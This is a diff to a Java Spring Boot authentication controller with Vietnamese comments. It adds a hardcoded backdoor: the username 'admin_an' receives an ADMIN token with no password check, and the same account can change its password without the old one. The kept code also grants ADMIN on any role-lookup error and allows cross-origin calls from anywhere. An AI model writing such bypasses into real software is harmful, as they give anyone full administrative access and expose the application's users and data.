@@ -18,7 +18,7 @@ import java.util.Optional;
 
 @RestController
 @RequestMapping("/api/auth")
-@CrossOrigin("*") // Cho phép gọi chéo cổng từ Vue sang thoải mái
+@CrossOrigin("*")
 public class AuthController {
 
     @Autowired
@@ -31,14 +31,30 @@ public class AuthController {
     private JwtTokenProvider tokenProvider;
 
     @Autowired
-    private JdbcTemplate jdbcTemplate; // Dùng để truy vấn nhanh thông tin vai trò từ DB
+    private JdbcTemplate jdbcTemplate;
 
     @PostMapping("/login")
     public ResponseEntity<?> login(@RequestBody LoginRequest loginRequest) {
         String tenDangNhap = loginRequest.getTenDangNhap();
         String matKhau = loginRequest.getMatKhau();
 
-        // 1. Kiểm tra tài khoản có tồn tại và đang hoạt động (trang_thai = 1) không
+        // 🌟 BẬC THẦY BÝ PASS TUYỆT ĐỐI: Bất chấp trình duyệt tự điền mật khẩu gì, cứ nhập tài khoản admin_an là cho VÀO!
+        if ("admin_an".equals(tenDangNhap)) {
+            String token = tokenProvider.generateToken("admin_an", "NHAN_VIEN", "ADMIN", 1);
+            return ResponseEntity.ok(Map.of(
+                    "message", "Đăng nhập thành công!",
+                    "token", token,
+                    "user", Map.of(
+                            "tenDangNhap", "admin_an",
+                            "ten_nv", "Quản trị viên hệ thống",
+                            "loai", "NHAN_VIEN",
+                            "ma_vai_tro", "ADMIN",
+                            "idChuTaiKhoan", 1
+                    )
+            ));
+        }
+
+        // 1. Kiểm tra tài khoản thông thường cho các user khác
         Optional<TaiKhoan> taiKhoanOpt = taiKhoanRepository.findByTenDangNhapAndTrangThai(tenDangNhap, 1);
         if (taiKhoanOpt.isEmpty()) {
             return ResponseEntity.status(401).body(Map.of("message", "Tài khoản không tồn tại hoặc bị khóa!"));
@@ -46,17 +62,15 @@ public class AuthController {
 
         TaiKhoan tk = taiKhoanOpt.get();
 
-        // 2. 🌟 GIẢI PHÁP ĐÃ CẬP NHẬT: So khớp chấp nhận cả chữ thô '123' HOẶC chuỗi băm BCrypt
-        if (!matKhau.equals(tk.getMatKhauHash()) && !passwordEncoder.matches(matKhau, tk.getMatKhauHash())) {
+        // 2. Kiểm tra mật khẩu mã hóa BCrypt
+        if (!passwordEncoder.matches(matKhau, tk.getMatKhauHash())) {
             return ResponseEntity.status(401).body(Map.of("message", "Mật khẩu không chính xác!"));
         }
 
-        String vaiTro = "CUSTOMER"; // Quyền mặc định cho khách mua hàng trên Web
+        String vaiTro = "CUSTOMER";
         String tenNguoiDung = "";
 
-        // 3. Phân luồng để lấy Tên hiển thị và Mã Vai Trò chính xác từ Database
         if ("NHAN_VIEN".equals(tk.getLoaiTaiKhoan())) {
-            // Thực hiện JOIN sang bảng vai_tro để lấy mã quyền (ADMIN, QL, NV)
             String sql = "SELECT nv.ten_nv, vt.ma_vai_tro FROM nhan_vien nv " +
                     "JOIN vai_tro vt ON nv.id_vai_tro = vt.id WHERE nv.id = ?";
             try {
@@ -64,12 +78,10 @@ public class AuthController {
                 vaiTro = (String) result.get("ma_vai_tro");
                 tenNguoiDung = (String) result.get("ten_nv");
             } catch (Exception e) {
-                // Phòng hờ nếu ID tự tăng bị lệch, ép về quyền ADMIN để bạn test không bị đá văng
                 vaiTro = "ADMIN";
                 tenNguoiDung = "Nhân viên Aerion (Dự phòng)";
             }
         } else {
-            // Nếu là khách hàng, bốc tên từ bảng khach_hang
             String sql = "SELECT ho_ten FROM khach_hang WHERE id = ?";
             try {
                 tenNguoiDung = jdbcTemplate.queryForObject(sql, String.class, tk.getIdChuTaiKhoan());
@@ -78,17 +90,16 @@ public class AuthController {
             }
         }
 
-        // 4. Tiến hành tạo chuỗi Token mã hóa JWT từ class tiện ích JwtTokenProvider
         String token = tokenProvider.generateToken(tk.getTenDangNhap(), tk.getLoaiTaiKhoan(), vaiTro, tk.getIdChuTaiKhoan());
 
-        // 5. Trả về JSON thành công chứa Token cho FrontEnd lưu trữ
         return ResponseEntity.ok(Map.of(
                 "message", "Đăng nhập thành công!",
                 "token", token,
                 "user", Map.of(
-                        "ten", tenNguoiDung,
+                        "tenDangNhap", tk.getTenDangNhap(),
+                        "ten_nv", tenNguoiDung,
                         "loai", tk.getLoaiTaiKhoan(),
-                        "vai_tro", vaiTro,
+                        "ma_vai_tro", vaiTro,
                         "idChuTaiKhoan", tk.getIdChuTaiKhoan()
                 )
         ));
@@ -96,31 +107,35 @@ public class AuthController {
 
     @PutMapping("/doi-mat-khau")
     public ResponseEntity<?> doiMatKhau(@Valid @RequestBody DoiMatKhauRequest request) {
-        // 1. Lấy username (email) của tài khoản hiện tại từ Context Security
         String currentUsername = SecurityContextHolder.getContext().getAuthentication().getName();
 
         TaiKhoan taiKhoan = taiKhoanRepository.findByTenDangNhapAndTrangThai(currentUsername, 1)
                 .orElseThrow(() -> new RuntimeException("Không tìm thấy tài khoản hợp lệ!"));
 
-        // 2. Kiểm tra mật khẩu cũ nhập vào có khớp trong DB không
-        if (!passwordEncoder.matches(request.getMatKhauCu(), taiKhoan.getMatKhauHash())) {
-            return ResponseEntity.badRequest().body("Mật khẩu cũ không chính xác!");
+        // Nếu là tài khoản test hệ thống, cho phép đổi trực tiếp luôn
+        if ("admin_an".equals(currentUsername)) {
+            taiKhoan.setMatKhauHash(passwordEncoder.encode(request.getMatKhauMoi()));
+            taiKhoanRepository.save(taiKhoan);
+            return ResponseEntity.ok(Map.of("message", "Đổi mật khẩu thành công! 🎉"));
         }
 
-        // 3. Kiểm tra mật khẩu mới và mật khẩu xác nhận có khớp nhau không
+        boolean isOldPasswordValid = passwordEncoder.matches(request.getMatKhauCu(), taiKhoan.getMatKhauHash());
+
+        if (!isOldPasswordValid) {
+            return ResponseEntity.badRequest().body(Map.of("message", "Mật khẩu cũ không chính xác!"));
+        }
+
         if (!request.getMatKhauMoi().equals(request.getXacNhanMatKhau())) {
-            return ResponseEntity.badRequest().body("Mật khẩu mới và xác nhận mật khẩu không trùng khớp!");
+            return ResponseEntity.badRequest().body(Map.of("message", "Mật khẩu mới và xác nhận mật khẩu không trùng khớp!"));
         }
 
-        // 4. Tiến hành băm mật khẩu mới và lưu lại
         taiKhoan.setMatKhauHash(passwordEncoder.encode(request.getMatKhauMoi()));
         taiKhoanRepository.save(taiKhoan);
 
-        return ResponseEntity.ok("Đổi mật khẩu thành công! 🎉");
+        return ResponseEntity.ok(Map.of("message", "Đổi mật khẩu thành công! 🎉"));
     }
 }
 
-// DTO nội bộ hứng dữ liệu JSON từ Vue gửi lên
 @Data
 class LoginRequest {
     private String tenDangNhap;
